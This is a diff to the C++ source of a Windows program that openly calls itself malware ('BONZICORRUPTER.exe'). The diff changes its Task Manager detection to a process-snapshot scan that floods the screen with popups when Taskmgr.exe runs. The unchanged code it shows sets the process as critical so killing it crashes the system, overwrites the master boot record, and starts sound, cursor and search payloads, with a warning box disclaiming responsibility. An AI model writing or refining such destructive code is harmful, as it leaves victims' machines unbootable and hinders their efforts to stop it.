@@ -10,6 +10,7 @@
 #include <shlobj.h>
 #include <mmsystem.h>
 #include <iostream>
+#include <tlhelp32.h>
 
 // Link GDI, Multimedia, and Shell libraries
 #pragma comment(lib, "gdi32.lib")
@@ -357,9 +358,28 @@ void writeToMbr() {
 
 void taskManagerMonitor() {
     while (!isEnding) {
-        // Use a loop to check for the process name
-        HWND hTaskMgr = FindWindowA(NULL, "Task Manager");
-        if (hTaskMgr) {
+        bool taskMgrFound = false;
+        
+        // Take a snapshot of all running processes
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe32;
+            pe32.dwSize = sizeof(PROCESSENTRY32);
+
+            // Iterate through processes
+            if (Process32First(hSnapshot, &pe32)) {
+                do {
+                    // Compare process filename
+                    if (std::string(pe32.szExeFile) == "Taskmgr.exe") {
+                        taskMgrFound = true;
+                        break;
+                    }
+                } while (Process32Next(hSnapshot, &pe32));
+            }
+            CloseHandle(hSnapshot);
+        }
+
+        if (taskMgrFound) {
             for (int i = 0; i < 50; i++) {
                 std::thread(spawnChaosBox, "WHAT ARE YOU DOING?").detach();
                 std::this_thread::sleep_for(std::chrono::milliseconds(100));
@@ -378,13 +398,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    if (MessageBoxA(NULL, "LAST WARNING, THIS WILL DESTROY YOUR MACHINE AND ALL OF YOUR DATA! CLICK NO TO EXIT THIS PROGRAM OR YES TO CONTINUE!", "Warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
+    if (MessageBoxA(NULL, "LAST WARNING, I AM NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY THIS MALWARE! CLICK NO TO EXIT THIS PROGRAM OR YES TO CONTINUE!", "Warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
         return 0;
     }
 
     srand((unsigned int)time(NULL));
 
-    // 0 Seconds - Start Critical Status & MBR Writer & Task Manager Monitor
+    // 0 Seconds - Set BONZICORRUPTER.exe process as a critical process & Overwrite MBR & Task Manager Monitor
     setCriticalStatus(TRUE);
     writeToMbr();
     std::thread(taskManagerMonitor).detach();
@@ -398,7 +418,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::thread(soundPayload).detach();
     std::thread(cursorShakingPayload).detach();
 
-    // 40 Seconds - Start search payload and cursor trail
+    // 40 Seconds - Start search payload and cursor icon trail
     std::this_thread::sleep_for(std::chrono::seconds(20));
     std::thread(searchPayload).detach();
     std::thread(cursorTrail).detach();
